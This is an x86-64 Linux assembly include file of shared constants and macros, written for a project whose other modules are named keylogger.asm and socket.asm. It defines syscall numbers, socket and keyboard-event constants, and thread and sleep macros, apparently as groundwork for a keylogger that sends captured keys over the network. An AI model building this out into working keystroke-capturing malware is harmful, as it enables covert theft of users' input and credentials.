; common.inc - Shared constants, macros, and includes
; Author: Samuel Gould
; Date: 2026-03-23
; Notes:
;   - Centralized constants and macros for main.asm, keylogger.asm, socket.asm
;   - Shared memory variables defined in main.asm

default rel

; - - - - - - Constants - - - - - -

; General
BUFFER_SIZE equ 1024
STACK_SIZE equ 131072        ; 128 KB per thread stack

; Syscalls
SYS_READ equ 0
SYS_WRITE equ 1
SYS_OPEN equ 2
SYS_CLOSE equ 3
SYS_EXIT equ 60
SYS_NANOSLEEP equ 35
SYS_CLONE equ 56
SYS_SOCKET equ 41
SYS_CONNECT equ 42

; Clone flags
CLONE_VM equ 100h
CLONE_FS equ 200h
CLONE_FILES equ 400h
CLONE_SIGHAND equ 800h
CLONE_THREAD equ 10000h
CLONE_IO equ 80000000h

CLONE_FLAGS equ CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD | CLONE_IO

; Socket constants
AF_INET equ 2
SOCK_STREAM equ 1

; File flags
O_RDONLY equ 0
O_WRONLY equ 1

; Keylogger constants
IE_KEY equ 1
IE_SIZE equ 24
KEY_ESC equ 1
KEY_LEFTSHIFT equ 42
KEY_RIGHTSHIFT equ 54
KEY_CAPSLOCK  equ 58

; Offsets in input_event struct
TYPE_OFFSET equ 16
CODE_OFFSET equ 18
VALUE_OFFSET equ 20

; - - - - - - Macros - - - - - -

; Thread creation macro
; Parameters:
;   %1 = Stack label
;   %2 = Thread entry point label
; Usage: CREATE_THREAD keylogger_stack, write_thread
%macro CREATE_THREAD 2
    mov rax, SYS_CLONE
    mov rdi, CLONE_FLAGS
    lea rsi, [%1 + STACK_SIZE]
    xor rdx, rdx
    xor r10, r10
    xor r8, r8
    syscall

    test rax, rax
    jz %2
%endmacro

; Sleep macro (seconds)
; Usage: SLEEP <seconds>
%macro SLEEP 1
    mov qword [ts_sec], %1
    mov qword [ts_nsec], 0
    mov rax, SYS_NANOSLEEP
    lea rdi, [ts_sec]
    xor rsi, rsi
    syscall
%endmacro

; Exit macro
; Usage: EXIT <code>
%macro EXIT 1
    mov rax, SYS_EXIT
    mov rdi, %1
    syscall
%endmacro

; Syscall error check
; Usage: CHECK_SYSCALL
; If rax < 0, jump to runtime_error
%macro CHECK_SYSCALL 0
    cmp rax, 0
    jl runtime_error
%endmacro

